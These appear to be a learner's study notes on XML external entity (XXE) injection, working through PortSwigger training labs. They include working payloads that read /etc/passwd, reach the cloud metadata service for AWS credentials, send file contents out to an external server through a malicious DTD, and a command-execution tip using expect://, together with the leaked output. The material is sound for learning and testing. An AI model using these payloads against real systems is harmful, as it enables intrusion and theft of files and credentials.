
XML= Extensible Markup Language (This language stores and forwards data) -TREE LIKE (structure as a tree)

Entities= a way to represent a element on the data without reference directly data (like a variable) all in a document XML

Types of entities:
- Generic / custom (< Nombre > Manolo < /Nombre >)
- External (XXE)
- Pre-defined (&lt;= < &gt;= >)


The most used XXE attack jave this structure:
```
<!DOCTYPE foo | [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```
We create a xml markup, and then we name it as "xxe" with SYSTEM we request data from "file://" and then the path is "/etc/passwd"

Another way but coded on base64

```
<!DOCTYPE foo | [<!ENTITY xxe SYSTEM "php:/filter/convert.base64-encode/resource=/etc/passwd">]>
```


We can reflect it on the output of the browser, where we put this input; for example

```
<!DOCTYPE foo | [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>

<email> &xxe </email>
```

We will obtain on the output the path

Now we are going to start with portswigger to see if we can do  the exercises 

# Exploiting XXE using external entities to retrieve files #

Here we have no DTD (DOCUMENT TYPE DEFINED)
```
<!DOCTYPE foo | [<!ENTITY xxe SYSTEM "file://etc/passwd">]>
```
So we are going to create one

And this is what we create:
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck>
<productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

And this is what we retrieve
```
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,


...and more
```

# Lab: Exploiting XXE to perform SSRF attacks #

(SSRF= Server Site Request Forgery)

He is explaining that sometimes with a simple scan we cannot find some opened ports

This is a SSRF what he is showing on the diagram

![[Screenshot_2023-08-26_11_24_36.png]]


"SYSTEM" charges an external entity that we can acces, it can be http or file, etc..
```
<!DOCTYPE foo | [<!ENTITY xxe SYSTEM "file://etc/passwd">]>
```

This is what we are doing right now on this lab, this diagram explains it (its a XXE+SSRF)

![[Screenshot_2023-08-26_11_32_06.png]]
So we did this
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>
&xxe;
</productId><storeId>1</storeId></stockCheck>
```

And we found this
```
Code" : "Success",
  "LastUpdated" : "2023-08-26T15:33:43.550101652Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "8S9FVaXWoSbmulKMPhX8",
  "SecretAccessKey" : "0IC5ubCGV9nlzGBWKyVsqtGlTgpKvYaSUvnq4M2S",
  "Token" : "UZuPYNplpVDZFDCcv99hi4Ku6bw6RcqaORtEoH6dtwAAxrddmAZYvAg4UpNOjJbNhiuMxqeCipmPpSBNxq7rDbN9FNxHXTQKgYObx04HBjwvwFgENqW3FbXNhAlQLOU012eBz6m7F5RjFBmSavomdCKfeftIbMQKzYmMquEJmXX8XPq0eMRjA7NgqsL7VZqpUXOFjnide4YqmULaJsgM7Sxu1SSn3JnbW5t6cDhtj8bWwfbwUKBVOaiW8wQVXXpy",
  "Expiration" : "2029-08-24T15:33:43.550101652Z"
```

# Blind XXE with out-of-band interaction #

As happens on the sql the problem is that we can resolve this lab  only with the "collaborator" of burpsuit. They do not permit third parties to resolve this lab.

We cant do it with a local resource, and with an external resource so I will just put as a "guide" what savitar is putting resolving the lab.

So on the XXE you need to use this DTD

(If you try the ones that we use before we are going to get "invalid product ID"). This is an indicator of possible XXE OOB 
```
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://theexternalurl.com/textXXE" >]>
```
So on that way we can retrieve info in our "ZAP" or the resource that we will use.

# Explanation blind XXE to exfiltrate data using a malicious external DTD #


He said that we can generate entities inside of entities. As you can se, we do not put the "variable or entity xxe on the markup of the XXE  ".
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://thesiteorip/malicious"> %xxe; ]>
```

In our computer we must put a python3 server and put inside of this a file called "malicious" with this content:

On burpsuit:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://172.16.0.140:80/malicious"> %xxe; ]>
```
But he is going to set it on base64 in this way.. he said "recordad que esto no es mas que un wrapper"

in the "?file=%file" is calling the first entity , that will be called on base64

&#x25 = % on hexadecimal notation

On my pc:

***TIP*** 
if you put "expect://whoami>"
instead of php in some occasions you can make command executions
```
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY %eval "<!ENTITY &#x25; exfil SYSTEM 'http://172.16.0.140/?file=%file;'>">
%eval;
%exfil;
```


# # Lab: [Blind XXE](https://portswigger.net/web-security/xxe/blind) with out-of-band interaction via XML parameter entities #


To solve this you need burp collaborator

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://collaboratorurl/testing"> %xxe; ]>
```

# # Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD #

We cant do this , but we have the explannation of the external DTD up
on the pc
```
<!DOCTYPE foo [<!ENTITY %xxe SYSTEM "url/"> %xxe;]>
```

SERVER:
```
<!ENTITY % file SYSTEM "file://etc/hostname">
<!ENTITY% eval "<!ENTITY &#x25; exfil SYSTEM 'http://theotherserver.com/?content=%file;'>">
%eval;
%exfil;
```


# Lab: Exploiting blind XXE to retrieve data via error messages #

We cant do this (?)

Here the exercise has his own server where put an exploit. We start searching if we can put our entities inside of the XML labels.

```
<!DOCTYPE foo[<!ENTITY xxe "testing" >] >

<product>
&xxe
</product>
```

and we get "entities are not allowed for security reasons"

Now we do the second try WITH AN EXTERNAL ENTITY

```
<!DOCTYPE foo[<!ENTITY % xxe SYSTEM "http://urlexternal.com">  %xxe; ] >

<product>
1
</product>
```

we recived this error :

```
"XML parser exited with error: java.net.UnknownHostException: urlexternal.com"
```

We are going to charge directly the resource from burpsuit server

URL: https://exploit-0afd002e032939f3816b2e060132008c.exploit-server.net/exploit


On the petition intercepted we must put this, that is refering to the server on the top
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a020037036c3a0f829b417701cd0038.exploit-server.net/exploit">  %xxe; ] >
```

So on the server we must script this:

iNSTEAD OF CHARGING A URL ON THE SECOND ENTITY-"SYSTEM" WE WILL TRY TO CHARGE A FILE, but that it doesnt exist
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///meloinvento/%file;'>">
%eval;
%exfil;
```

#  Lab: Exploiting XInclude to retrieve files #

On this case if you intercept it , you dont see the XML structure

## Payload all the things ##

Excelent website
https://github.com/swisskyrepo/PayloadsAllTheThings

This is the XXE portion

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```
Everything on the "productId="

This is the response
```
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 2339

"Invalid product ID: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
elmer:x:12099:12099::/home/elmer:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
messagebus:x:101:101::/nonexistent:/usr/sbin/nologin
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
systemd-timesync:x:103:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:104:105:systemd Network Management,
```

#  Lab: Exploiting XXE via image file upload #

This is the payload and we put the image there

```
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
   <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

remember unificate everything on burpsuit or zap . It is possible that doesnt work.

We pull the comment and now, we must open the image "open the url of the image" and the hostname is on it